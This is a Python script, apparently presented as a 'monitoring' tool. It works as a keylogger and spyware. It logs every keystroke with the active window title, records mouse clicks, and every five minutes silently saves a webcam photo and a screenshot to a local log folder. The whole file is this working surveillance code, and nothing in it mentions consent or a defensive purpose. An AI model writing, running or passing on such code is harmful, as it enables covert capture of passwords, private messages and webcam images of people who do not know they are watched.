# -*- coding: utf-8 -*-
import logging
import os
import cv2
import pyautogui
import pygetwindow as gw
from pynput.keyboard import Key, Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import datetime
import threading
import time

log_directory = "./log/"
if not os.path.exists(log_directory):
    os.makedirs(log_directory)
def setup_logging():
    log_file_name = os.path.join(log_directory, f"log_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")
    logging.basicConfig(filename=log_file_name, level=logging.INFO, format='%(asctime)s: %(message)s')
    return log_file_name

def get_active_window_title():
    try:
        return gw.getActiveWindow().title
    except Exception:
        return "Unknown window"

def capture_webcam_image():
    image_path = os.path.join(log_directory, f"webcam_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.jpg")
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        logging.error("Webcam access error.")
        return
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(image_path, frame)
        logging.info("Webcam snapshot taken.")
    cap.release()
    cv2.destroyAllWindows()

def capture_screen():
    image_path = os.path.join(log_directory, f"screen_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(image_path)
    logging.info("Screen captured.")

def on_press(key):
    window_title = get_active_window_title()
    try:
        logging.info(f"Keystroke: '{key.char}' in {window_title}")
    except AttributeError:
        if key == Key.space:
            logging.info(f"Keystroke: ' ' (space) in {window_title}")
        elif key == Key.enter:
            logging.info(f"Keystroke: 'ENTER' in {window_title}")
        elif key == Key.backspace:
            logging.info(f"Keystroke: 'BACKSPACE' in {window_title}")
        else:
            logging.info(f"Keystroke: {key} in {window_title}")

def on_click(x, y, button, pressed):
    window_title = get_active_window_title()
    if pressed:
        logging.info(f"Mouse click at ({x}, {y}) in {window_title}")

def periodic_tasks():
    capture_webcam_image()
    capture_screen()

def start_periodic_tasks(interval=300):
    next_call = time.time()
    while True:
        periodic_tasks()
        next_call = next_call + interval
        time.sleep(max(0, next_call - time.time()))

def main():
    log_file_name = setup_logging()
    print('Monitoring started')
    logging.info("Monitoring started - Logs are being saved")

    periodic_thread = threading.Thread(target=start_periodic_tasks, args=(300,))  # Executes every 5 minutes
    periodic_thread.daemon = True
    periodic_thread.start()

    with KeyboardListener(on_press=on_press) as k_listener, MouseListener(on_click=on_click) as m_listener:
        k_listener.join()
        m_listener.join()

    logging.info("Monitoring ended.")
    print("Monitoring ended")

if __name__ == "__main__":
    main()